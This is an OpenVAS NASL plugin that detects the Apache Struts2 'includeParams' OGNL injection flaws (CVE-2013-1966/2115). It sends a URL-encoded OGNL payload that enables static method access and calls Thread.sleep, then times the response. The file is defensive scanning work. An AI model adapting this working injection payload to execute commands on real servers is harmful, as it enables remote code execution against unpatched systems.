###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts2_java_method_exec_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Apache Struts2 'URL' & 'Anchor' tags Arbitrary Java Method Execution Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if(description)
{
  script_id(803837);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-1966", "CVE-2013-2115");
  script_bugtraq_id(60166, 60167);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-07-23 17:54:59 +0530 (Tue, 23 Jul 2013)");
  script_name("Apache Struts2 'URL' & 'Anchor' tags Arbitrary Java Method Execution Vulnerabilities");

  tag_summary =
"This host is running Apache Struts2 and is prone to arbitrary java
method execution vulnerabilities.";

  tag_vuldetect =
"Send a crafted data like system functions via HTTP POST request and check
whether it is executing the java function or not.";

  tag_insight =
"Flaw is due to improper handling of the includeParams attribute in
the URL and Anchor tags";

  tag_impact =
"Successful exploitation will allow remote attackers to execute arbitrary
commands via specially crafted OGNL (Object-Graph Navigation Language) expressions.";

  tag_affected =
"Apache Struts 2 before 2.3.14.2";

  tag_solution =
"Upgrade to Apache Struts 2 version 2.3.14.2 or later,
For updates refer to http://struts.apache.org";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/93645");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/53553");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/25980");
  script_xref(name : "URL" , value : "https://cwiki.apache.org/confluence/display/WW/S2-013");
  script_xref(name : "URL" , value : "http://struts.apache.org/development/2.x/docs/s2-014.html");
  script_xref(name : "URL" , value : "http://metasploit.org/modules/exploit/multi/http/struts_include_params");
  script_summary("Check if Apache Struts2 is vulnerable to java method execution vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
asport = 0;
asreq = "";
asres = "";
asRes = "";
asReq = "";
dir = "";
url = "";

## Get HTTP Port
asport = get_http_port(default:8080);
if(!asport){
  asport = 8080 ;
}

## Check the port status
if(!get_port_state(asport)){
  exit(0);
}

## check the possible paths
foreach dir (make_list("", "/struts2", "/struts", "/framework", "/struts2-blank"))
{
  ## Send and Receive the response
  asreq = http_get(item:string(dir,"/example/HelloWorld.action"), port:asport);
  asres = http_keepalive_send_recv(port:asport, data:asreq);

  ## Confirm the application
  if(asres && ">Struts" >< asres && ">English<" >< asres)
  {
    sleep = make_list(3, 5);

    foreach i (sleep)
    {
      ## Construct the POST data
      postdata = "fgoa=%24%7b%23%5fmemberAccess%5b%22allow"+
                 "StaticMethodAccess%22%5d%3dtrue%2c%40jav"+
                 "a.lang.Thread%40sleep%28"+ i +"000%29%7d";

      ## Construct the POST request
      asReq = string("POST /struts2-blank/example/HelloWorld.action HTTP/1.1\r\n",
                     "Host: ", get_host_name(), "\r\n",
                     "User-Agent:  Java-Method-Execution\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen(postdata), "\r\n",
                     "\r\n", postdata);

      start = unixtime();
      asRes = http_send_recv(port:asport, data:asReq);
      stop = unixtime();

      if(stop - start < i || stop - start > (i+5)) exit(0); # not vulnerable
    }
    security_hole(port:port);
    exit(0);
  }
}
